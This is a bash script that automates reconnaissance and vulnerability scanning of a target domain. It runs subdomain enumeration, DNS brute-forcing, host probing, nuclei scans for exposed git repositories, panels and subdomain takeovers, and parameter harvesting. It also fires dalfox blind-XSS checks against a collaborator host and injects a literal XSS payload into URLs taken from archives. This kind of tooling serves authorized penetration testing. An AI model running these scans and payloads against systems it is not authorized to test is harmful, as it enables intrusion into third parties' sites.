#!/bin/bash

function def_handler(){
	echo -e "\n[+]Exit...\n"
	cp *_$name $path
	rm -rf output/
	rm -rf *_$name
	exit 1
}

# Ctrl + C
trap def_handler INT

getfreshresolvers() {
	wget https://raw.githubusercontent.com/trickest/resolvers/main/resolvers.txt -O /root/Lists/resolvers.txt
}

domain=$1
collaborator=$2
path="/tmp/recon/$domain"
mkdir -p $path
mkdir -p output
name=$(echo "$domain"| cut -d "." -f 1)
echo -e "\n[+]Sub_enum: $domain\n"
echo $domain | subfinder --silent | anew sub_$name
curl -s "https://crt.sh/?q=%25.$domain&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | anew sub_$name
cat sub_$name | haktldextract | anew | grep -v @ | dnsgen - | anew dns_$name
cat sub_$name | tr '.' '\n' | anew words_$name
mksub -d $domain -w words_$name -l 2 | anew dns_$name
cat dns_$name | dnsx -resp -silent | awk '{print $1}' | anew sub_$name
getfreshresolvers
for dom in $(cat sub_$name);do shuffledns -massdns /root/go/bin/massdns -d $dom -r /root/Lists/resolvers.txt -w /root/Lists/subdomains-top1million-110000.txt | anew brute_$name ;done
cat *_$name | grep -i -v "<" | anew fullsub_$name
cat fullsub_$name | grep -i $name | sponge fullsub_$name
echo -e "\n[+]Check_hosts: $domain\n"
cat fullsub_$name | httpx -silent -title -status-code -tech-detect -timeout 10 -threads 100 | anew httpok_$name
cat httpok_$name | grep 200 | awk -F " " '{print $1}' | anew 200http_$name
cat httpok_$name | grep 403 | awk '{print $1}' | anew 403http_$name
cat httpok_$name | grep -v 404 | awk '{print $1}' | anew without404_$name
cat httpok_$name | awk -F " " '{print $1}' | anew allhttp_$name
echo -e "\n[+]Git_Detect: $domain\n"
cat allhttp_$name | nuclei -tags git | anew gitdetect_$name
xargs -a allhttp_$name -I@ bash -c "goop @ -f" | anew gitdetect_$name
echo -e "\n[+]crt: $domain\n"
curl -s https://crt.sh/?q=%.$domain | sed 's/<\/\?[^>]\+>//g' | grep $domain | anew crt_$name
echo -e "\n[+]nstakeover: $domain\n"
dig $domain +trace | grep NS | awk '{print $5}' | anew | egrep -Ev "root-servers|NS|NSEC3|NSEC" | sed 's/\.$//' | xargs -I{} bash -c "dig @{}   $domain | grep 'SERVFAIL' && echo '{} Is vulnerable'"
ip=$(ping -c 1 $domain | grep -oP "\(.*\)" | awk '{print $1}' | anew | tr -d "()")
dnsenum --dnsserver $ip -t 50 -f /root/Lists/subdomains-top1million-5000.txt $domain
echo -e "\n[+]nuclei_custom: $domain\n"
nuclei --update
nuclei --update-templates
xargs -a allhttp_$name -I@ bash -c "nuclei -u @ -s low,medium,high,critical -eid expired-ssl,mismatched-ssl,deprecated-tls,weak-cipher-suites,self-signed-ssl -t /opt/Nuclei-Templates-Collection" | anew nucleicustom_$name
echo -e "\n[+]nuclei: $domain\n"
xargs -a allhttp_$name -I@ bash -c "nuclei -u @ -s low,medium,high,critical -eid expired-ssl,mismatched-ssl,deprecated-tls,weak-cipher-suites,self-signed-ssl -t /root/nuclei-templates" | anew nuclei_$name
echo -e "\n[+]wildcards\n"
cat fullsub_$name | grep '*' | sed 's/\*\.//g' | anew wildcards_$name
echo -e "\n[+]paramspider: $domain"
xargs -a fullsub_$name -I@ bash -c 'python3 /opt/ParamSpider/paramspider.py -d @ -l high --exclude jpg,png,gif,woff,css,js,svg,woff2,ttf,eot,json' | anew params_$name
cat output/* | anew params_$name
echo -e "\n[+]dalfox: $domain\n"
dalfox file params_$name -b $collaborator --output-all dalf_$name
echo -e "\n[+]waymore\n"
python3 /opt/waymore/waymore.py -i $domain -mode U | anew waymore_$name
echo -e "\ncrawler: $domain\n"
cat fullsub_$name | waybackurls | egrep -v "eot|jpg|jpeg|gif|css|tif|tiff|png|ttf|otf|woff|woff|ico|svg" | anew urls_$name
cat fullsub_$name | gauplus -b "eot,jpg,jpeg,gif,css,tif,tiff,png,ttf,otf,woff,woff2,ico,svg" | anew urls_$name
echo -e "\n[+]siteminderdetect\n"
cat allhttp_$name | nuclei -tags siteminder -o siteminderdetect_$name
echo -e "\n[+]swaggerdetect\n"
cat allhttp_$name | nuclei -tags swagger -o swaggerdetect_$name
echo -e "\n[+]paneldetect\n"
cat allhttp_$name | nuclei -tags pane,panel -o paneldetect_$name
echo -e "\n[+]graphqldetect\n"
cat allhttp_$name | nuclei -tags graphql -o graphqldetect_$name
echo -e "\n[+]nuctakeover\n"
cat allhttp_$name | nuclei -t /root/nuclei-custom-templates/m4cddr-takeovers.yaml -o nucleitakeover_$name
echo -e "\nxss_oneliner\n"
xargs -a fullsub_$name -I@ bash -c "echo \"@\" | waybackurls | gf xss | uro | qsreplace '\"><img src=x onerror=alert(1);>' | freq | egrep -v 'Not|frequester|-_-'" | anew xss_$name
cp *_$name $path
rm -rf output
rm -rf *_$name